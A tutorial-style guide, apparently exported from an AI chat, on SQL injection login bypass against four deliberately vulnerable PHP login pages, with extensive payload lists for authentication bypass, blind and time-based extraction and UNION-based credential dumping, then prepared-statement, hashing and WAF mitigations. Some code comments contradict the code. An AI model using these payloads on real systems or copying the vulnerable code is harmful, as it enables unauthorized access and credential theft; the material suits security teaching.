# 🔐 SQL Injection Authentication Bypass - Complete Guide

## 📋 Table of Contents

- [Vulnerable Code - login-1.php](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#vulnerable-code---login-1php)
- [Vulnerable Code - login-2.php](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#vulnerable-code---login-2php)
- [Vulnerable Code - login-3.php](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#vulnerable-code---login-3php)
- [Vulnerable Code - login-4.php](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#vulnerable-code---login-4php)
- [Updated Example Attack Payloads - Double Quote Context](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#updated-example-attack-payloads---double-quote-context)
- [Payloads for Single Quote and Closing Parenthesis Injection](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#payloads-for-single-quote-and-closing-parenthesis-injection)
- [Payloads for Double Quotes and Parentheses](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#payloads-for-double-quotes-and-parentheses)
- [Mitigation Strategies](https://claude.ai/chat/291232e6-909b-40a4-8cde-810c3cf37ea4#mitigation-strategies)

---

## 🔍 Vulnerable Code - login-1.php

```php
<?php

// Include database connection file
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>User Login</title>
</head>
<body>

<div style=" margin-top:70px; font-size:23px; text-align:center">
    <h1><span class="style4">User Login</span> <br>
    <font size="3" color="#666666">

<!-- Login form posts to same PHP page -->
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">

    Username: <input type="text" name="username" value="" /> <br />
    Password: <input type="text" name="password" value="" /> <br />
    <input type="submit" name="Login" value="Login" />

</form>

<?php

    if (isset($_POST['username']) && isset($_POST['password'])) {
        
        // Get username and password from POST request
        $username=$_POST['username'];
        $password=$_POST['password'];
        
        // Wrap user input in double quotes (This does NOT prevent SQL injection!)
        // Example malicious input: Username: admin')-- 
        // Resulting query: WHERE name=('admin')-- ) and password=('...')
        // The remaining AND password clause is commented out and ignored; bypass is possible.
        //
        // Also: Parentheses do NOT prevent SQL injection—payloads should close the parentheses and inject.
        $username2="'" . $username . "'";
        $password2="'" . $password . "'";
        
        // Vulnerable query: user input directly interpolated
        // VULNERABILITY: User input is directly placed inside SQL query; possible SQL injection.
        // Example injection: Username: admin')-- 
        // Resulting query: WHERE name=('admin')-- ) and password=('...')
        $query = "SELECT name, password FROM users WHERE name=('$username') and password=('$password') LIMIT 0,1";
        
        //echo $query . "</br>"; // For debugging, shows generated SQL query.
        
        // Execute query
        $result = mysqli_query($connection, $query);
        
        // On query failure, display MySQL error (information leakage vulnerability)
        if (!$result) {
            die("Database Query Failed: " . mysqli_error($connection));
        }
        
        // If query returns rows, display user info (including plain passwords)
        if (mysqli_num_rows($result) > 0) {
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your Name:'. ' ' . $row['name'];
                echo "<br>";
                echo 'Your Password:' . ' - ' . $row['password'];
                echo "</font>";
            }
        } else {
            // Otherwise, display invalid login message
            echo '<font color="#ff0000">Invalid username or password</font>';
        }
        
    } else {
        // Prompt user to enter credentials if form not submitted yet
        echo '<font color="#ff0000">Please enter username and password</font>';
    }
    
?>

</font> </h1>

</div>
</br></br></br>

</body>
</html>
```

---

## 🔍 Vulnerable Code - login-2.php

```php
<?php

// Include database connection file
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>User Login</title>
</head>
<body>

<div style=" margin-top:70px; font-size:23px; text-align:center">
    <h1><span class="style4">User Login</span> <br>
    <font size="3" color="#666666">

<!-- Login form posts to same PHP page -->
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">

    Username: <input type="text" name="username" value="" /> <br />
    Password: <input type="text" name="password" value="" /> <br />
    <input type="submit" name="Login" value="Login" />

</form>

<?php

    if (isset($_POST['username']) && isset($_POST['password'])) {
        
        // Get username and password from POST request
        $username=$_POST['username'];
        $password=$_POST['password'];
        
        // Wrap user input in double quotes (This does NOT prevent SQL injection!)
        // Example malicious input: Username: admin")-- 
        // Resulting query: WHERE name=("admin")-- ") and password=("...")
        // The remaining AND password clause is commented out and ignored; bypass is possible.
        //
        $username2="'" . $username . "'";
        $password2="'" . $password . "'";
        
        // Vulnerable query: user input directly interpolated
        // VULNERABILITY: User input is directly placed inside SQL query; possible SQL injection.
        // Example injection: Username: admin")-- 
        $query = "SELECT name, password FROM users WHERE name=(\"$username\") and password=(\"$password\") LIMIT 0,1";
        
        //echo $query . "</br>"; // For debugging, shows generated SQL query.
        
        // Execute query
        $result = mysqli_query($connection, $query);
        
        // Show error message if the query fails (information leakage).
        if (!$result) {
            die("Database Query Failed: " . mysqli_error($connection));
        }
        
        // If rows returned, display user data (including plaintext password—never do this in production).
        if (mysqli_num_rows($result) > 0) {
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your Name:'. ' ' . $row['name'];
                echo "<br>";
                // SECURITY: Avoid showing passwords in plaintext
                echo 'Your Password:' . ' - ' . $row['password'];
                echo "</font>";
            }
        } else {
            echo '<font color="#ff0000">Invalid username or password</font>';
        }
        
    } else {
        echo '<font color="#ff0000">Please enter username and password</font>';
    }

?>

</font> </h1>

</div>
</br></br></br>

</body>
</html>
```

---

## 🔍 Vulnerable Code - login-3.php

```php
<?php

// Include database connection file
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>User Login</title>
</head>
<body>

<div style=" margin-top:70px; font-size:23px; text-align:center">
    <h1><span class="style4">User Login</span> <br>
    <font size="3" color="#666666">

<!-- Login form posts to this page -->
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">

    Username: <input type="text" name="username" value="" /> <br />
    Password: <input type="text" name="password" value="" /> <br />
    <input type="submit" name="Login" value="Login" />

</form>

<?php

    // Check for submitted username and password.
    if (isset($_POST['username']) && isset($_POST['password'])) {
        
        // Get form values directly.
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        // Wrap user input in double quotes (This does NOT prevent SQL injection!)
        // Example malicious input: Username: admin')-- 
        // Resulting query: WHERE name=('admin')-- ) and password=('...')
        // The remaining AND password clause is commented out and ignored; bypass is possible.
        //
        // Also: Parentheses do NOT prevent SQL injection—payloads should close the parentheses and inject.
        $username2="'" . $username . "'";
        $password2="'" . $password . "'";
        
        // Vulnerable query: user input directly interpolated
        // VULNERABILITY: User input is directly placed inside SQL query; possible SQL injection.
        // Example injection: Username: admin')-- 
        // Resulting query: WHERE name=('admin')-- ) and password=('...')
        // The remaining AND password clause is commented out and ignored; bypass is possible.
        //
        $query = "SELECT name, password FROM users WHERE name=('$username') and password=('$password') LIMIT 0,1";
        
        //echo $query . "</br>"; // For debugging, shows generated SQL query.
        
        // Execute the query.
        $result = mysqli_query($connection, $query);
        
        // Show error message if the query fails (information leakage).
        if (!$result) {
            die("Database Query Failed: " . mysqli_error($connection));
        }
        
        // If rows returned, display user data (including plaintext password—never do this in production).
        if (mysqli_num_rows($result) > 0) {
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your Name:'. ' ' . $row['name'];
                echo "<br>";
                // SECURITY: Avoid showing passwords in plaintext
                echo 'Your Password:' . ' - ' . $row['password'];
                echo "</font>";
            }
        } else {
            echo '<font color="#ff0000">Invalid username or password</font>';
        }
        
    } else {
        echo '<font color="#ff0000">Please enter username and password</font>';
    }

?>

</font> </h1>

</div>
</br></br></br>

</body>
</html>
```

---

## 🔍 Vulnerable Code - login-4.php

```php
<?php

// Include DB connection
include("connection.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>User Login</title>
</head>
<body>

<div style=" margin-top:70px; font-size:23px; text-align:center">
    <h1><span class="style4">User Login</span> <br>
    <font size="3" color="#666666">

<!-- Login form posts to this page -->
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">

    Username: <input type="text" name="username" value="" /> <br />
    Password: <input type="text" name="password" value="" /> <br />
    <input type="submit" name="Login" value="Login" />

</form>

<?php

    // Check for submitted username and password.
    if (isset($_POST['username']) && isset($_POST['password'])) {
        
        // Get form values directly.
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        // SQL query with username and password surrounded by parentheses.
        // VULNERABILITY: User input is directly placed inside SQL query; possible SQL injection.
        // Example injection: Username: admin')-- 
        // Resulting query: WHERE name=('admin')-- ) and password=('...')
        // The remaining AND password clause is commented out and ignored; bypass is possible.
        //
        // Also: Parentheses do NOT prevent SQL injection—payloads should close the parentheses and inject.
        $query = "SELECT name, password FROM users WHERE name=('$username') and password=('$password') LIMIT 0,1";
        
        //echo $query . "</br>"; // For debugging, shows generated SQL query.
        
        // Execute the query.
        $result = mysqli_query($connection, $query);
        
        // Show error message if the query fails (information leakage).
        if (!$result) {
            // Displays detailed DB error (leakage).
            die("Database Query Failed: " . mysqli_error($connection));
        }
        
        // If rows returned, display user data (including plaintext password-never do this in production).
        if (mysqli_num_rows($result) > 0) {
            while ($row = mysqli_fetch_assoc($result)) {
                echo '<font color="#0000ff">';
                echo 'Your Name:'. ' - ' . $row['name'];
                echo "<br>";
                // SECURITY: Avoid showing passwords in plaintext
                echo 'Your Password:' . ' - ' . $row['password'];
                echo "</font>";
            }
        } else {
            echo '<font color="#ff0000">Invalid username or password</font>';
        }
        
    } else {
        echo '<font color="#ff0000">Please enter username and password</font>';
    }

?>

</font> </h1>

</div>
</br></br></br>

</body>
</html>
```

---

## 💉 Updated Example Attack Payloads for Double Quote Context

### Authentication Bypass

```
admin" OR "1"="1"-- -
```

```
admin" OR 1=1 #
```

```
" OR "1"="1
```

```
admin"-- -
```

---

### Extract Database Name Length

```
admin" AND LENGTH(DATABASE())=1-- -
```

```
admin" AND LENGTH(DATABASE())=2-- -
```

---

### Extract Database Name Character-by-Character

```
admin" AND ASCII(SUBSTR(DATABASE(),1,1))=97-- -
```

```
admin" AND ASCII(SUBSTR(DATABASE(),2,1))=98-- -
```

---

### Time-Based Extraction

```
admin" AND IF(ASCII(SUBSTR(DATABASE(),1,1))=97, SLEEP(5), 0)-- -
```

```
admin" AND IF(LENGTH(DATABASE())=9, SLEEP(5), 0)-- -
```

---

### Extract Table Names

```
admin" UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

---

### Ends the query and comments out the rest of the SQL statement.

```
" --
```

---

### Attempts to order the result set by the second column. Can reveal number of columns or cause errors revealing database structure.

```
" order by 2 --
```

---

### Uses UNION to append the current database user to the result set.

```
" union all select 1,2,3,4,5,6,7,8 --
```

```
" union all select 1,2 --
```

```
" union all select current_user(), 2 --
```

---

### Selects a dummy value and the current database name.

```
" union all select 1, database() --
```

---

### Injects current user and database name into query result.

```
" union all select current_user(), database() --
```

---

### Attempts to extract email and password from `users` table limited to first record. Very dangerous as it exposes sensitive user credentials.

```
" union all select email, password from users limit 0,1 --
```

---

## 💉 Payloads for Single Quote and Closing Parenthesis Injection

### Authentication Bypass:

```
admin') OR '1'='1'-- -
```

```
admin') OR 1=1 #
```

```
') OR '1'='1
```

```
admin')--
```

---

### Extract Database Name Length:

```
admin') AND LENGTH(DATABASE())=7 -- -
```

```
admin') AND LENGTH(DATABASE())=9 -- -
```

---

### Extract Database Name Character-by-Character:

```
admin') AND ASCII(SUBSTR(DATABASE(),1,1))=115 -- -
```

```
admin') AND ASCII(SUBSTR(DATABASE(),2,1))=113 -- -
```

---

### Time-Based Extraction:

```
admin') AND IF(ASCII(SUBSTR(DATABASE(),1,1))=115, SLEEP(10), 0)-- -
```

```
admin') AND IF(LENGTH(DATABASE())=7, SLEEP(10), 0)-- -
```

---

### Extract Table Names:

```
admin') UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

---

### Ends the query and comments out the rest:

```
') --
```

---

### Attempts to order the result set by the second column (column enumeration):

```
') order by 2 --
```

---

### Uses UNION to append current database info:

```
') union all select 1,2,3,4,5,6,7,8 --
```

```
') union all select 1,2 --
```

```
') union all select current_user(), 2 --
```

---

### Selects a dummy value and current database name:

```
') union all select 1, database() --
```

---

### Injects current user and database into query result:

```
') union all select current_user(), database() --
```

---

### Attempts to extract email and password from `users` table (highly sensitive):

```
') union all select email, password from users limit 0,1 --
```

---

## 💉 Payloads for Double Quotes and Parentheses

### Authentication Bypass

```
admin") OR "1"="1"-- -
```

```
admin") OR 1=1 \#
```

```
") OR "1"="1
```

```
") OR "1"="1" -- -
```

```
admin")--
```

---

### Extract Database Name Length

```
admin") AND LENGTH(DATABASE())=7 -- -
```

```
admin") AND LENGTH(DATABASE())=9 -- -
```

---

### Extract Database Name Character-by-Character

```
admin") AND ASCII(SUBSTR(DATABASE(),1,1))=115 -- -
```

```
admin") AND ASCII(SUBSTR(DATABASE(),2,1))=113 -- -
```

---

### Time-Based Extraction

```
admin") AND IF(ASCII(SUBSTR(DATABASE(),1,1))=115, SLEEP(10), 0)-- -
```

```
admin") AND IF(LENGTH(DATABASE())=7, SLEEP(10), 0)-- -
```

---

### Extract Table Names

```
admin") UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

---

### Ends the query and comments out the rest of the SQL statement.

```
") --
```

---

### Attempts to order the result set by the second column. Can reveal number of columns or cause errors revealing database structure.

```
") order by 2 --
```

---

### Uses UNION to append the current database user to the result set.

```
") union all select 1,2,3,4,5,6,7,8 --
```

```
") union all select 1,2 --
```

```
") union all select current_user(), 2 --
```

---

### Selects a dummy value and the current database name.

```
") union all select 1, database() --
```

---

### Injects current user and database name into query result.

```
") union all select current_user(), database() --
```

---

### Attempts to extract email and password from `users` table limited to first record. Very dangerous as it exposes sensitive user credentials.

```
") union all select email, password from users limit 0,1 --
```

---

## 💉 Authentication Bypass Payloads - SQL Injection

### Complete Payload Reference

These payloads close the parentheses and double quotes properly before injecting SQL code, ensuring syntactically valid and effective injections in the context of queries like:

```sql
SELECT name, password FROM users WHERE name=("user_input") AND password=("user_input") LIMIT 0,1;
```

Attackers use these modified payloads to bypass authentication, enumerate database structure, extract sensitive data, or cause delays (time-based injection). Proper input handling requires prepared statements or parameterized queries to prevent such exploits.

---

### Basic Boolean-Based Payloads

```
0' or '0' = '0
1' or '1' = '1
'='
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
or true--
' or true--
') or true--
') or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
```

---

### Double Quote Context Payloads

```
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

---

### Explanation of Key Payloads

#### 1. **Basic OR Injection**

```
0' or '0' = '0
1' or '1' = '1
```

- Creates always-true conditions
- Bypasses authentication by making WHERE clause always evaluate to true
- Works in single-quote context

#### 2. **Empty and Special Character Payloads**

```
'='
' '
'&'
'^'
'*'
```

- Minimal payloads that can cause syntax errors or unexpected behavior
- Used for reconnaissance to understand query structure

#### 3. **Comment-Based Injection**

```
admin' --
admin' #
admin'/*
```

- Single quote closes the username field
- Comment characters (`--`, `#`, `/*`) ignore rest of query
- Bypasses password check entirely

#### 4. **Classic Authentication Bypass**

```
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
```

- Most common SQL injection payload
- Works by:
    1. Closing username quote with `'`
    2. Adding `or '1'='1'` (always true)
    3. Commenting out password check with `--`, `#`, or `/*`

**Resulting Query:**

```sql
SELECT name, password FROM users WHERE name=('admin' or '1'='1'--') AND password=('anything')
```

The `--` comments out everything after, making the password irrelevant.

#### 5. **Parenthesis Closing Injection**

```
admin') or ('1'='1
admin') or ('1'='1'--
```

- Used when query has parentheses around input
- Closes both quote and parenthesis before injection
- Syntax: `')` closes `('`, then injects OR condition

**Original Query:**

```sql
WHERE name=('$input') AND password=('$input')
```

**Injected Query:**

```sql
WHERE name=('admin') or ('1'='1'--') AND password=('anything')
```

#### 6. **Double Parenthesis Injection**

```
')) or (('x'))=(('x
```

- For queries with nested parentheses
- Properly closes multiple levels of grouping

#### 7. **UNION-Based Injection with Hash**

```
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
```

- `AND 1=0` makes original query return no results
- `UNION ALL SELECT` appends fabricated row
- `'81dc9bdb52d04dc20036dbd8313ed055'` is MD5 hash of "admin"
- Injects fake admin credentials into result set

**Complete Query:**

```sql
SELECT name, password FROM users WHERE name=('1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055') AND password=('anything')
```

#### 8. **Double Quote Variants**

All single-quote payloads have double-quote equivalents:

```
admin" or "1"="1
admin") or ("1"="1"--
```

- Used when application uses double quotes in SQL query
- Functionally identical to single-quote versions

---

### Context-Specific Usage

#### For Query: `WHERE name=('$input')`

Use payloads:

```
admin') or '1'='1'--
') or '1'='1'--
```

#### For Query: `WHERE name=("$input")`

Use payloads:

```
admin") or "1"="1"--
") or "1"="1"--
```

#### For Query: `WHERE name='$input'`

Use payloads:

```
admin' or '1'='1'--
' or '1'='1'--
```

#### For Query: `WHERE name="$input"`

Use payloads:

```
admin" or "1"="1"--
" or "1"="1"--
```

---

### Attack Strategy

1. **Reconnaissance Phase**
    
    - Try simple payloads: `'`, `"`, `')`, `")`
    - Observe error messages or behavior changes
    - Identify quote style and parenthesis usage
2. **Exploitation Phase**
    
    - Use appropriate payload based on query structure
    - Start with basic OR injection
    - Escalate to UNION injection if needed
3. **Data Extraction Phase**
    
    - Use UNION SELECT to retrieve data
    - Extract database name, tables, columns
    - Retrieve sensitive information (passwords, emails)

---

### Detection and Prevention

**How to Detect:**

- Monitor for special characters in input: `'`, `"`, `--`, `#`, `/*`, `OR`, `UNION`
- Log authentication failures with suspicious patterns
- Use Web Application Firewall (WAF) with SQL injection rules

**How to Prevent:**

- **ALWAYS use prepared statements** (parameterized queries)
- Never concatenate user input into SQL queries
- Implement input validation (whitelist approach)
- Use least privilege database accounts
- Hash passwords with bcrypt/Argon2 (never store plaintext)

---

## 🛡️ Mitigation Strategies

### 1. Use Prepared Statements (Parameterized Queries) - BEST PRACTICE

```php
// SECURE VERSION using prepared statements
$stmt = $connection->prepare("SELECT name, password FROM users WHERE name = ? AND password = ? LIMIT 0,1");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    // Process login
} else {
    echo "Invalid credentials";
}

$stmt->close();
```

**Why this works:**

- User input is never directly concatenated into SQL
- Database treats input as data, not executable code
- Most effective defense against SQL injection

---

### 2. Input Validation and Sanitization

```php
// Escape special characters
$username = mysqli_real_escape_string($connection, $_POST['username']);
$password = mysqli_real_escape_string($connection, $_POST['password']);

// Validate input format (whitelist approach)
if (!preg_match("/^[a-zA-Z0-9_]{3,20}$/", $username)) {
    die("Invalid username format");
}

// Limit input length
if (strlen($username) > 20 || strlen($password) > 100) {
    die("Input too long");
}
```

**Note**: Escaping alone is NOT sufficient - always use prepared statements as primary defense.

---

### 3. Use Password Hashing - CRITICAL SECURITY PRACTICE

```php
// NEVER store plaintext passwords

// On user registration:
$hashed_password = password_hash($password, PASSWORD_BCRYPT);
// Store $hashed_password in database

// On login verification:
$stmt = $connection->prepare("SELECT id, name, password_hash FROM users WHERE name = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 1) {
    $user = $result->fetch_assoc();
    
    // Verify password against hash
    if (password_verify($password, $user['password_hash'])) {
        // Authentication successful
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['name'];
    } else {
        echo "Invalid credentials";
    }
} else {
    echo "Invalid credentials";
}
```

---

### 4. Implement Least Privilege Principle

```sql
-- Create a limited database user for the application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password_here';

-- Grant ONLY necessary permissions
GRANT SELECT ON database_name.users TO 'webapp'@'localhost';
GRANT INSERT ON database_name.logs TO 'webapp'@'localhost';

-- Revoke all other permissions
REVOKE ALL PRIVILEGES ON database_name.* FROM 'webapp'@'localhost';

-- Never use root or admin accounts in application code
```

**Benefits:**

- Limits damage if SQL injection occurs
- Attacker cannot drop tables or modify schema
- Reduces attack surface

---

### 5. Proper Error Handling - Don't Leak Information

```php
// DON'T reveal database errors to users
if (!$result) {
    // Log error internally for debugging
    error_log("Database error: " . mysqli_error($connection));
    
    // Show generic message to user
    die("An error occurred. Please try again later.");
}

// Production configuration (in php.ini or runtime):
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
```

**Why this matters:**

- Database errors reveal table names, column names, query structure
- Attackers use this information to craft precise injection attacks
- Generic errors prevent reconnaissance

---

### 6. Web Application Firewall (WAF)

**Deploy ModSecurity or Cloud WAF:**

```apache
# ModSecurity rule example (Apache)
SecRule ARGS "@rx (\bunion\b.*\bselect\b|\bor\b.*[=<>]|--|\#|\/\*)" \
    "id:1001,\
     phase:2,\
     t:lowercase,\
     deny,\
     status:403,\
     msg:'SQL Injection Attempt Detected'"
```

**Cloud WAF Solutions:**

- Cloudflare WAF
- AWS WAF
- Azure WAF
- Akamai Kona Site Defender

---

### 7. Additional Security Measures

#### Rate Limiting

```php
// Limit login attempts
session_start();

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['last_attempt'] = time();
}

// Reset counter after 15 minutes
if (time() - $_SESSION['last_attempt'] > 900) {
    $_SESSION['login_attempts'] = 0;
}

if ($_SESSION['login_attempts'] >= 5) {
    die("Too many login attempts. Please try again in 15 minutes.");
}

$_SESSION['login_attempts']++;
$_SESSION['last_attempt'] = time();
```

#### CAPTCHA Implementation

```php
// Add CAPTCHA after 3 failed attempts
if ($_SESSION['login_attempts'] >= 3) {
    // Require CAPTCHA verification
    if (!verify_captcha($_POST['captcha_response'])) {
        die("CAPTCHA verification failed");
    }
}
```

#### Logging and Monitoring

```php
// Log all authentication attempts
function log_auth_attempt($username, $success, $ip) {
    $log_file = '/var/log/webapp/auth.log';
    $timestamp = date('Y-m-d H:i:s');
    $status = $success ? 'SUCCESS' : 'FAILED';
    
    $entry = sprintf(
        "[%s] %s login attempt for user '%s' from IP %s\n",
        $timestamp,
        $status,
        $username,
        $ip
    );
    
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
}

// Call after authentication attempt
log_auth_attempt($username, $auth_success, $_SERVER['REMOTE_ADDR']);
```

---

## 📚 Additional Resources

### OWASP References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Cheat Sheet: SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### Testing Tools

- **SQLMap**: Automated SQL injection testing tool
    
    ```bash
    sqlmap -u "http://example.com/login.php" --data="username=test&password=test" --dbs
    ```
    
- **Burp Suite**: Web application security testing platform
- **OWASP ZAP**: Free, open-source security scanner
- **Nikto**: Web server scanner

### Learning Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [HackTheBox](https://www.hackthebox.com/) - Practical penetration testing labs
- [TryHackMe](https://tryhackme.com/) - Guided cybersecurity training
- [DVWA](https://github.com/digininja/DVWA) - Damn Vulnerable Web Application (practice environment)

---

## ⚠️ Legal Disclaimer

**IMPORTANT**: The techniques described in this document are for **educational purposes only**.

### Legal Warnings:

- ✅ Only test on systems you **own** or have **explicit written permission** to test
- ❌ Unauthorized access to computer systems is **illegal** in most jurisdictions
- ⚖️ Violations may result in criminal prosecution under laws like:
    - Computer Fraud and Abuse Act (CFAA) - United States
    - Computer Misuse Act - United Kingdom
    - Similar legislation worldwide

### Ethical Use:

- Use this knowledge to **build secure applications**
- Improve **defensive security** posture
- Conduct **authorized security assessments** only
- Report vulnerabilities **responsibly** through proper channels

**The author and distributors of this document assume no liability for misuse of this information.**

---

## 🎓 Summary

SQL injection remains one of the most critical and widespread web application vulnerabilities.

### Key Takeaways:

1. **Never trust user input** - Always validate, sanitize, and use prepared statements
2. **Use parameterized queries** - Prepared statements are the #1 defense against SQL injection
3. **Hash passwords properly** - Use `password_hash()` and `password_verify()` - NEVER store plaintext
4. **Minimize information leakage** - Don't expose database errors or structure to users
5. **Apply principle of least privilege** - Limit database user permissions to minimum necessary
6. **Implement defense in depth** - Use multiple layers: WAF, input validation, prepared statements, monitoring
7. **Regular security testing** - Continuously test for vulnerabilities in development and production
8. **Security awareness training** - Educate developers on secure coding practices

---

### Quick Reference: Common SQL Injection Patterns

|Pattern Type|Example Payload|Purpose|Defense|
|---|---|---|---|
|Comment injection|`admin'--`|Bypass password check|Prepared statements|
|OR injection|`' OR '1'='1`|Always true condition|Input validation + prepared statements|
|UNION injection|`' UNION SELECT ...`|Extract additional data|Prepared statements + least privilege|
|Time-based blind|`' AND SLEEP(5)--`|Infer data via delays|Prepared statements + timeout limits|
|Error-based|`' AND 1=CONVERT(int, @@version)--`|Extract data via errors|Error suppression + prepared statements|
|Stacked queries|`'; DROP TABLE users--`|Execute multiple statements|Prepared statements + limited permissions|

---

### Testing Checklist for Developers:

- [ ] All database queries use prepared statements or parameterized queries
- [ ] User input is validated against whitelist patterns
- [ ] Passwords are hashed using bcrypt or Argon2 (never stored in plaintext)
- [ ] Database errors are logged internally, not displayed to users
- [ ] Application uses dedicated database account with minimal permissions
- [ ] Failed login attempts are rate-limited and logged
- [ ] Security headers are properly configured (CSP, X-Frame-Options, etc.)
- [ ] Regular security scans are performed (automated + manual penetration testing)
- [ ] Code reviews include security-focused review of database interactions
- [ ] Security logging and monitoring is in place for anomaly detection

---

### Secure Code Template (Copy-Paste Ready):

```php
<?php
session_start();
require_once 'config.php'; // Database configuration

// Rate limiting
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['last_attempt'] = time();
}

if (time() - $_SESSION['last_attempt'] > 900) {
    $_SESSION['login_attempts'] = 0;
}

if ($_SESSION['login_attempts'] >= 5) {
    die("Too many failed attempts. Try again in 15 minutes.");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Input validation
    if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
        $_SESSION['login_attempts']++;
        die("Invalid username format");
    }
    
    // Prepared statement
    $stmt = $pdo->prepare("SELECT id, username, password_hash FROM users WHERE username = ? LIMIT 1");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($user && password_verify($password, $user['password_hash'])) {
        // Successful authentication
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['login_attempts'] = 0;
        
        // Log success
        error_log("Successful login: {$username} from {$_SERVER['REMOTE_ADDR']}");
        
        header('Location: dashboard.php');
        exit;
    } else {
        // Failed authentication
        $_SESSION['login_attempts']++;
        $_SESSION['last_attempt'] = time();
        
        // Log failure
        error_log("Failed login attempt: {$username} from {$_SERVER['REMOTE_ADDR']}");
        
        $error = "Invalid username or password";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <meta charset="UTF-8">
</head>
<body>
    <h2>Login</h2>
    <?php if (isset($error)): ?>
        <p style="color: red;"><?= htmlspecialchars($error) ?></p>
    <?php endif; ?>
    
    <form method="POST" action="">
        <label>Username: <input type="text" name="username" required pattern="[a-zA-Z0-9_]{3,20}"></label><br>
        <label>Password: <input type="password" name="password" required></label><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

---

## 📊 Vulnerability Severity Matrix

|Vulnerability|CVSS Score|Impact|Likelihood|Priority|
|---|---|---|---|---|
|SQL Injection (Auth Bypass)|**9.8 Critical**|Complete system compromise|High|**P0 - Fix Immediately**|
|Plaintext Password Storage|**8.1 High**|Credential exposure|Medium|**P0 - Fix Immediately**|
|Information Leakage (Errors)|**5.3 Medium**|Reconnaissance aid|High|**P1 - Fix This Sprint**|
|No Rate Limiting|**5.0 Medium**|Brute force attacks|Medium|**P2 - Fix Soon**|

---

## 🔄 Incident Response Plan

If you discover SQL injection in production:

### Immediate Actions (Within 1 Hour):

1. **Isolate affected systems** - Take vulnerable pages offline if possible
2. **Enable WAF rules** - Block malicious SQL patterns
3. **Review logs** - Check for signs of exploitation
4. **Notify security team** - Escalate to incident response

### Short-Term Actions (Within 24 Hours):

1. **Deploy hot fix** - Implement prepared statements
2. **Force password reset** - If credential exposure suspected
